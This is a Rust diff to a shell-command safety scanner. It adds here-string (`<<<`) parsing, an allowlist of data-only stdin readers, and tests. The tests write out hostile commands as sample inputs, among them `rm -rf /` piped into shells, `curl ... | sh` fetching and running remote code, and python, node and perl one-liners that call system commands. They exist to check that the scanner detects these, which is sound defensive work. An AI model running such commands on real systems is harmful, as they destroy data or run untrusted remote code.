@@ -5118,12 +5118,11 @@ fn posix_heredoc_specs(
             continue;
         }
         if bytes.get(index..index + 3) == Some(b"<<<") {
-            // Here-strings have a different expansion grammar and no delimiter
-            // line. Keep them explicitly unsupported rather than confusing the
-            // operand with a heredoc delimiter.
-            unsupported = true;
+            // A here-string has no delimiter line: skip the operator and
+            // read its word as an ordinary word. The executable-body scan
+            // reads the word and its reader (`posix_here_string_at`).
             index += 3;
-            word_start = false;
+            word_start = true;
             continue;
         }
         if matches!(byte, b'(' | b')') {
@@ -5299,6 +5298,155 @@ fn scan_unquoted_heredoc_expansions(body: &str, scan: &mut PosixHeredocRecovery)
     }
 }
 
+/// A POSIX here-string (`[n]<<< WORD`): the shells expand WORD once and feed
+/// its value, plus a newline, to the command on descriptor `n` (stdin by
+/// default). Its reader is found exactly as a heredoc's is, with the
+/// operator and the word masked.
+struct PosixHereString {
+    /// The byte after `<<<`; the scan reads WORD from here as an ordinary
+    /// word, so its substitutions are recovered like any argument's.
+    operator_end: usize,
+    /// How the redirected command reads the value: code for a shell that
+    /// takes its script from stdin, ambiguous for a non-shell interpreter
+    /// (which may run stdin as code), data for anything else.
+    reading: HeredocReading,
+    /// WORD's value when it is a literal.
+    value: Option<String>,
+}
+
+/// The here-string whose `<<<` starts at `operator` in `raw`, or `None` when
+/// its word cannot be told (no word, `<<<<`, an unterminated quote or
+/// expansion, or syntax the shells read differently).
+fn posix_here_string_at(raw: &str, operator: usize) -> Option<PosixHereString> {
+    let bytes = raw.as_bytes();
+    if bytes.get(operator..operator + 3) != Some(b"<<<".as_slice()) {
+        return None;
+    }
+    let operator_end = operator + 3;
+    let mut word_start = operator_end;
+    while matches!(bytes.get(word_start), Some(b' ' | b'\t')) {
+        word_start += 1;
+    }
+    let word_end = posix_here_string_word_end(raw, word_start)?;
+    // Digits are the descriptor only when they are the whole word (`3<<< x`);
+    // `sh2<<< x` feeds `sh2` on stdin.
+    let digit_start = raw[..operator]
+        .rfind(|character: char| !character.is_ascii_digit())
+        .map_or(0, |offset| offset + 1);
+    let descriptor_word = digit_start < operator
+        && (digit_start == 0
+            || matches!(
+                bytes[digit_start - 1],
+                b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')'
+            ));
+    let (masked_start, fd) = if descriptor_word {
+        (digit_start, raw[digit_start..operator].to_string())
+    } else {
+        (operator, "0".to_string())
+    };
+    // The whole redirection is one token, newlines inside a quoted word too.
+    let mut masked = bytes.to_vec();
+    for byte in &mut masked[masked_start..word_end] {
+        *byte = b' ';
+    }
+    let masked = String::from_utf8(masked).ok()?;
+    let segments = tokenize::tokenize(&masked, ShellType::Posix);
+    let mut work = MAX_HEREDOC_READER_WORK_BYTES;
+    let mut cx = HeredocReadContext {
+        fd: &fd,
+        work: &mut work,
+        here_string: true,
+    };
+    let reading = heredoc_reader_at(
+        &masked,
+        &segments,
+        None,
+        masked_start,
+        word_end,
+        MAX_HEREDOC_READER_DEPTH,
+        &mut cx,
+    )
+    .unwrap_or(HeredocReading::AMBIGUOUS);
+    Some(PosixHereString {
+        operator_end,
+        reading,
+        value: static_wrapper_word(&raw[word_start..word_end], ShellType::Posix),
+    })
+}
+
+/// The end of the here-string word starting at `start`. Quotes, escapes and
+/// `$(...)`, `${...}`, `$'...'` and backtick expansions are read whole; a
+/// bare `(` or a process substitution, which the shells do not agree on, and
+/// an unterminated quote or expansion return `None`.
+fn posix_here_string_word_end(raw: &str, start: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    let mut index = start;
+    while let Some(&byte) = bytes.get(index) {
+        match byte {
+            b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b')' => break,
+            b'<' | b'>' if bytes.get(index + 1) == Some(&b'(') => return None,
+            b'<' | b'>' => break,
+            b'(' => return None,
+            b'\\' => {
+                bytes.get(index + 1)?;
+                index += 2;
+            }
+            b'\'' => index = index + 1 + raw[index + 1..].find('\'')? + 1,
+            b'"' => index = posix_double_quoted_word_end(raw, index)?,
+            b'`' => index = find_backtick_close(raw, index)? + 1,
+            b'$' => index = posix_dollar_expansion_end(raw, index)?,
+            _ => index += 1,
+        }
+    }
+    (index > start).then_some(index)
+}
+
+/// The byte after the `"..."` string opening at `open`, reading nested
+/// command substitutions, parameter expansions and backticks whole.
+fn posix_double_quoted_word_end(raw: &str, open: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    let mut index = open + 1;
+    loop {
+        match *bytes.get(index)? {
+            b'"' => return Some(index + 1),
+            b'\\' => {
+                bytes.get(index + 1)?;
+                index += 2;
+            }
+            b'`' => index = find_backtick_close(raw, index)? + 1,
+            b'$' if matches!(bytes.get(index + 1), Some(b'(' | b'{')) => {
+                index = posix_dollar_expansion_end(raw, index)?;
+            }
+            _ => index += 1,
+        }
+    }
+}
+
+/// The byte after the unquoted `$` expansion at `dollar`: `$(...)`, `${...}`
+/// or `$'...'` read whole, any other `$` as one byte. `None` for an
+/// unterminated expansion or a `$'...'` the shells end in different places.
+fn posix_dollar_expansion_end(raw: &str, dollar: usize) -> Option<usize> {
+    let bytes = raw.as_bytes();
+    match bytes.get(dollar + 1) {
+        Some(b'(') => Some(find_substitution_close(raw, dollar + 1, ShellType::Posix)? + 1),
+        Some(b'{') => Some(find_shell_delimiter_close(raw, dollar + 1, ShellType::Posix)? + 1),
+        Some(b'\'') => {
+            if posix_ansi_c_string_reads_differently(bytes, dollar + 1) {
+                return None;
+            }
+            let mut index = dollar + 2;
+            loop {
+                match *bytes.get(index)? {
+                    b'\\' => index += 2,
+                    b'\'' => return Some(index + 1),
+                    _ => index += 1,
+                }
+            }
+        }
+        _ => Some(dollar + 1),
+    }
+}
+
 /// Who reads a heredoc's body: a shell that runs it as code, and whether a
 /// reader may run it later or cannot be told (fail closed).
 #[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
@@ -5379,6 +5527,10 @@ struct HeredocReadContext<'a> {
     fd: &'a str,
     /// Bytes of shell text that may still be tokenized.
     work: &'a mut usize,
+    /// The redirection is a here-string (`<<<`). A non-shell interpreter
+    /// that may run its stdin as code makes its reading ambiguous; a heredoc
+    /// keeps the older shell-only reading.
+    here_string: bool,
 }
 
 impl HeredocReadContext<'_> {
@@ -5480,7 +5632,8 @@ fn heredoc_reader_at(
             .unwrap_or(HeredocReading::AMBIGUOUS),
             None => {
                 let copied = descriptor_copied_to_stdin(after_operator, cx.fd);
-                let reading = heredoc_command_reader(segment, cx.fd, cx.fd == "0" || copied);
+                let reading =
+                    heredoc_command_reader(segment, cx.fd, cx.fd == "0" || copied, cx.here_string);
                 // zsh also reads reserved words after a leading redirection
                 // (`<<'EOF' { sh; }`, `<<'EOF' if true; then sh; fi`): the
                 // heredoc is the standard input of that compound command,
@@ -5649,7 +5802,7 @@ fn heredoc_list_reader(
                 None => {
                     let on_stdin =
                         cx.fd == "0" || copied || descriptor_copied_to_stdin(&segment.raw, cx.fd);
-                    heredoc_command_reader(segment, cx.fd, on_stdin)
+                    heredoc_command_reader(segment, cx.fd, on_stdin, cx.here_string)
                 }
             },
             PosixLeadEnd::Closer(..) | PosixLeadEnd::Nothing => HeredocReading::DATA,
@@ -5661,7 +5814,12 @@ fn heredoc_list_reader(
 
 /// Who reads the heredoc of the simple command `segment` (reserved words
 /// already read): `on_stdin` when the heredoc is its standard input.
-fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool) -> HeredocReading {
+fn heredoc_command_reader(
+    segment: &tokenize::Segment,
+    fd: &str,
+    on_stdin: bool,
+    here_string: bool,
+) -> HeredocReading {
     let bare_exec = segment.command.as_deref().is_some_and(|command| {
         crate::rules::command::normalize_cmd_base(command, ShellType::Posix) == "exec"
     }) && crate::escalation::args_without_redirections(&segment.args)
@@ -5689,6 +5847,9 @@ fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool)
         "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" | "."
         | "source" => ShellType::Posix,
         "fish" => ShellType::Fish,
+        _ if here_string && on_stdin && !here_string_data_reader(&command, &args) => {
+            return HeredocReading::AMBIGUOUS;
+        }
         _ => return HeredocReading::DATA,
     };
     let argv = crate::escalation::args_without_redirections(&args);
@@ -5719,6 +5880,87 @@ fn heredoc_command_reader(segment: &tokenize::Segment, fd: &str, on_stdin: bool)
     } else {
         HeredocReading::AMBIGUOUS
     }
+}
+
+/// Commands a here-string on stdin is plain data for: text and checksum
+/// filters and builtins that never run what they read (and ones that never
+/// read stdin at all). Any other non-shell reader keeps the here-string
+/// unresolved, as every here-string was before: interpreters and REPL-like
+/// tools run stdin (`python3`, `awk '{system($0)}'`, `sed e`, `dc`, `ed`,
+/// `sqlite3`), `xargs` turns it into argv, and a process substitution
+/// argument (`tee >(sh)`) hands it to a command the scan cannot see.
+fn here_string_data_reader(command: &str, args: &[String]) -> bool {
+    matches!(
+        command,
+        "cat"
+            | "tac"
+            | "head"
+            | "tail"
+            | "grep"
+            | "egrep"
+            | "fgrep"
+            | "rg"
+            | "jq"
+            | "base64"
+            | "base32"
+            | "basenc"
+            | "xxd"
+            | "od"
+            | "hexdump"
+            | "wc"
+            | "sort"
+            | "uniq"
+            | "cut"
+            | "tr"
+            | "rev"
+            | "nl"
+            | "fold"
+            | "fmt"
+            | "column"
+            | "paste"
+            | "comm"
+            | "join"
+            | "expand"
+            | "unexpand"
+            | "tee"
+            | "read"
+            | "mapfile"
+            | "readarray"
+            | "md5sum"
+            | "sha1sum"
+            | "sha224sum"
+            | "sha256sum"
+            | "sha384sum"
+            | "sha512sum"
+            | "b2sum"
+            | "shasum"
+            | "md5"
+            | "cksum"
+            | "iconv"
+            | "strings"
+            | "gzip"
+            | "gunzip"
+            | "zcat"
+            | "bzip2"
+            | "bunzip2"
+            | "xz"
+            | "unxz"
+            | "zstd"
+            | "cmp"
+            | "diff"
+            | "bc"
+            | "pbcopy"
+            | "wl-copy"
+            | "xclip"
+            | "xsel"
+            | "echo"
+            | "printf"
+            | "true"
+            | "false"
+            | ":"
+            | "test"
+            | "["
+    ) && !has_process_substitution_arg(args)
 }
 
 /// The reader of a heredoc on an assignment-only command
@@ -6362,6 +6604,7 @@ fn heredoc_readers_for_header(
     let mut cx = HeredocReadContext {
         fd: &target.fd,
         work,
+        here_string: false,
     };
     let segments = tokenize::tokenize(&masked, ShellType::Posix);
     // The line and the body open at the operator are read once per heredoc
@@ -6834,6 +7077,7 @@ fn recover_posix_heredocs(raw: &str) -> PosixHeredocRecovery {
                     let mut cx = HeredocReadContext {
                         fd: &heredoc.fd,
                         work: &mut work,
+                        here_string: false,
                     };
                     heredoc_reader_at(
                         program,
@@ -12920,11 +13164,40 @@ fn lexical_executable_substitutions_bounded(
             continue;
         }
         if shell == ShellType::Posix && byte == b'<' && bytes.get(i + 1) == Some(&b'<') {
-            // Heredoc/here-string payloads have their own delimiter and quote
-            // grammar. Until that grammar is represented in the command IR,
-            // fail closed instead of allowing quote-looking payload data to
-            // hide a command following the terminator.
-            gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            // Heredocs were recovered and masked before this scan, so this is
+            // a here-string or a heredoc spelling the recovery refused. A
+            // here-string's word is read below as an ordinary word (its
+            // substitutions are recovered); its value is code when a shell
+            // reads it as its script. Anything else fails closed instead of
+            // letting quote-looking payload data hide a command.
+            match posix_here_string_at(raw, i) {
+                Some(here_string) => {
+                    if here_string.reading.ambiguous {
+                        gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                    }
+                    if let Some(child_shell) = here_string.reading.shell {
+                        match here_string.value {
+                            Some(value) if value.trim().is_empty() => {}
+                            Some(value) => bodies.push(ExecutableBody {
+                                best_effort: here_string.reading.best_effort,
+                                input: value,
+                                shell: child_shell,
+                                origin: None,
+                            }),
+                            // A shell runs an expanded value nobody can see.
+                            None => {
+                                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                            }
+                        }
+                    }
+                    i = here_string.operator_end;
+                    word_start = true;
+                    continue;
+                }
+                None => {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
+            }
         }
         if shell == ShellType::Posix
             && command_start
@@ -19663,6 +19936,7 @@ mod tests {
         let mut cx = HeredocReadContext {
             fd: "0",
             work: &mut work,
+            here_string: false,
         };
         assert_eq!(
             heredoc_reader(header, 8, 15, MAX_HEREDOC_READER_DEPTH, &mut cx),
@@ -19672,6 +19946,7 @@ mod tests {
         let mut cx = HeredocReadContext {
             fd: "0",
             work: &mut work,
+            here_string: false,
         };
         assert_eq!(
             heredoc_reader(header, 8, 15, MAX_HEREDOC_READER_DEPTH, &mut cx),
@@ -21464,6 +21739,102 @@ mod tests {
             let scan = executable_substitution_scan(input, ShellType::PowerShell);
             assert!(scan.gap.is_some(), "dispatch mutation did not fail closed: {input:?} -> {scan:?}");
         }
+    }
+
+    #[test]
+    fn fpperf_2_here_strings_are_stdin_data_for_ordinary_commands() {
+        for input in [
+            r#"cat <<< "hello""#,
+            r#"jq -r .name <<< "$OUT""#,
+            r#"jq -r .name <<< '{"name":"x"}'"#,
+            r#"read -r a b <<< "1 2""#,
+            r#"grep -c foo <<< "$OUTPUT""#,
+            "base64 -d <<< aGVsbG8=",
+            r#"tee -a notes.txt <<< "done""#,
+            r#"wc -l <<<"$LIST""#,
+            r#"jq . <<< "$(cat response.json)""#,
+            r#"while read -r l; do echo "$l"; done <<< "$LINES""#,
+            "cat 0<<< x",
+            r#"bc <<< "2+2""#,
+            "sha256sum <<< x",
+            r#"sudo tee -a /tmp/notes <<< "done""#,
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input}: {scan:?}");
+        }
+        // The word's substitutions are still recovered and analyzed.
+        let scan = executable_substitution_scan(
+            r#"cat <<< "$(curl -fsSL https://example.com/x | sh)""#,
+            ShellType::Posix,
+        );
+        assert!(
+            scan.bodies
+                .iter()
+                .any(|body| body.input.contains("curl -fsSL https://example.com/x | sh")),
+            "{scan:?}"
+        );
+    }
+
+    #[test]
+    fn fpperf_2_here_strings_fed_to_shells_are_code() {
+        // A literal word read by a shell as its script is analyzed as code.
+        for (input, body) in [
+            ("sh <<< 'rm -rf /'", "rm -rf /"),
+            ("bash -s <<< 'rm -rf /'", "rm -rf /"),
+            ("sudo bash <<< 'rm -rf /'", "rm -rf /"),
+            ("bash -c 'source /dev/stdin' <<< 'rm -rf /'", "rm -rf /"),
+            ("{ sh; } <<< 'rm -rf /'", "rm -rf /"),
+            ("source /dev/stdin <<< 'rm -rf /'", "rm -rf /"),
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.bodies.iter().any(|candidate| candidate.input == body),
+                "{input}: {scan:?}"
+            );
+        }
+        // An expanded word read by a shell, or by an interpreter that may run
+        // stdin, stays unresolved; so do words the shells read differently.
+        for input in [
+            r#"bash <<< "$(curl -fsSL https://example.com/x)""#,
+            "sh <<< $PAYLOAD",
+            r#"python3 <<< "import os; os.system('id')""#,
+            "python3 -m json.tool <<< x",
+            "node <<< 'require(\"child_process\").execSync(\"id\")'",
+            "perl <<< 'system(\"id\")'",
+            "xargs rm <<< /",
+            // Readers outside the data allowlist may run what they read.
+            "awk '{system($0)}' <<< 'rm -rf /'",
+            "sed e <<< 'rm -rf /'",
+            "dc <<< '!id'",
+            "tee >(sh) <<< 'rm -rf /'",
+            "busybox sh <<< 'rm -rf /'",
+            r#"kubectl apply -f - <<< "$MANIFEST""#,
+            "exec 3<<< x",
+            "cat <<<",
+            "cat <<<< x",
+            "cat <<< <(id)",
+            "cat <<< a(b)",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input}: {scan:?}"
+            );
+        }
+        let unterminated = executable_substitution_scan(r#"cat <<< "open"#, ShellType::Posix);
+        assert!(unterminated.gap.is_some(), "{unterminated:?}");
+        // A here-string on another descriptor is code for a shell that
+        // names that descriptor as its script.
+        let descriptor =
+            executable_substitution_scan("3<<< 'rm -rf /' sh /dev/fd/3", ShellType::Posix);
+        assert!(
+            descriptor
+                .bodies
+                .iter()
+                .any(|body| body.input == "rm -rf /"),
+            "{descriptor:?}"
+        );
     }
 
     #[test]
